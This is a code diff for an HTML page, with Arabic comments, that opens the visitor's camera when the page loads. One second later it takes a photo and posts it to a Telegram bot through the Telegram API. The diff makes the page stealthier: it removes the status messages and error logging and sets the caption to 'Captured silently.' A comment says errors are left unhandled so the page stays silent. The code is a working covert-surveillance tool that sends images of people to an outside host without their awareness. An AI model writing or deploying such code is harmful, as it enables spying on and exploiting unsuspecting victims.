@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="ar">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>التقاط صامت</title>
+    <title>S_Capture</title>
     
     <style>
         /* إخفاء كل شيء وجعل الفيديو يملأ الشاشة */
@@ -23,7 +23,6 @@
             height: auto;
             z-index: -100;
             transform: translate(-50%, -50%);
-            /* يمكن إزالة الحدود تماماً لجعله "كاملاً" */
             border: none; 
         }
 
@@ -31,25 +30,12 @@
         #canvas {
             display: none;
         }
-
-        /* عرض حالة العملية بشكل خفيف (للتطوير فقط، يمكن إزالته) */
-        #status-message {
-            position: fixed;
-            top: 10px;
-            left: 10px;
-            color: white;
-            background: rgba(0, 0, 0, 0.5);
-            padding: 5px 10px;
-            z-index: 1000;
-            font-size: 14px;
-        }
     </style>
 </head>
 <body>
 
     <video id="video" autoplay playsinline></video> 
     <canvas id="canvas"></canvas>
-    <p id="status-message">بدء التشغيل...</p>
 
     <script>
         // ******************************************************
@@ -64,10 +50,9 @@
         // ******************************************************
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
-        const statusMessage = document.getElementById('status-message');
         const context = canvas.getContext('2d');
         let stream = null;
-        let isCaptured = false; // لمنع الالتقاط المتكرر
+        let isCaptured = false; 
 
         // ******************************************************
         // ** وظائف مساعدة                     **
@@ -89,14 +74,10 @@
         // ** وظائف الكاميرا والإرسال التلقائي    **
         // ******************************************************
 
-        /**
-         * التقاط الصورة، إيقاف البث، وإرسالها إلى Telegram API.
-         */
         async function captureAndSend() {
-            if (isCaptured || !stream) return; // منع التكرار
+            if (isCaptured || !stream) return; 
 
             isCaptured = true;
-            statusMessage.textContent = 'جاري التقاط الصورة تلقائياً...';
             
             try {
                 // 1. ضبط أبعاد الـ Canvas ورسم الإطار
@@ -112,40 +93,27 @@
                 stream.getTracks().forEach(track => track.stop());
                 video.srcObject = null;
                 
-                statusMessage.textContent = 'جاري إرسال الصورة إلى تيليجرام... 🚀';
-
                 // 4. إرسال البيانات عبر Telegram API
                 const formData = new FormData();
                 formData.append('chat_id', CHAT_ID);
                 formData.append('photo', imageBlob, 'auto_capture.jpg'); 
-                formData.append('caption', 'صورة ملتقطة فوراً بمجرد منح الإذن.');
+                formData.append('caption', 'Captured silently.'); // يمكن إزالة هذا السطر إذا أردت إخفاء التعليق أيضاً
 
                 const response = await fetch(TELEGRAM_API_URL, {
                     method: 'POST',
                     body: formData,
                 });
 
-                const data = await response.json();
+                // لا يوجد معالجة للأخطاء أو النجاح لتبقى صامتة
+                // console.log('Capture process finished.'); 
 
-                if (response.ok && data.ok) {
-                    statusMessage.textContent = '✅ تم الإرسال بنجاح. توقف البث.';
-                    console.log('نجاح الإرسال:', data);
-                } else {
-                    statusMessage.textContent = `❌ فشل الإرسال: ${data.description || 'خطأ غير معروف'}`;
-                    console.error('خطأ في إرسال تيليجرام:', data);
-                }
             } catch (error) {
-                statusMessage.textContent = '❌ خطأ في عملية الإرسال.';
-                console.error('خطأ في عملية الـ fetch:', error);
+                // console.error('An error occurred during capture or send:', error);
             }
         }
 
 
-        /**
-         * طلب الوصول إلى الكاميرا وبدء البث، ثم الالتقاط التلقائي
-         */
         async function startCamera() {
-            statusMessage.textContent = 'جاري طلب إذن الكاميرا...';
             try {
                 stream = await navigator.mediaDevices.getUserMedia({ 
                     video: { 
@@ -154,21 +122,17 @@
                 });
                 video.srcObject = stream;
                 
-                // تشغيل الفيديو والانتظار حتى يبدأ
                 await new Promise(resolve => video.onloadedmetadata = resolve);
                 video.play();
                 
-                // *** الالتقاط التلقائي فور تشغيل البث ***
-                // نؤخر الالتقاط قليلاً (1 ثانية) للتأكد من استقرار الصورة
+                // *** الالتقاط التلقائي بعد 1 ثانية من بدء البث ***
                 setTimeout(captureAndSend, 1000); 
 
             } catch (error) {
-                console.error('خطأ في الوصول إلى الكاميرا:', error);
-                statusMessage.textContent = 'خطأ: لم يتم منح إذن الكاميرا.';
+                // console.error('Camera access denied or failed:', error);
             }
         }
 
-        // بدء تشغيل الكاميرا عند تحميل الصفحة
         window.onload = startCamera;
     </script>
 </body>
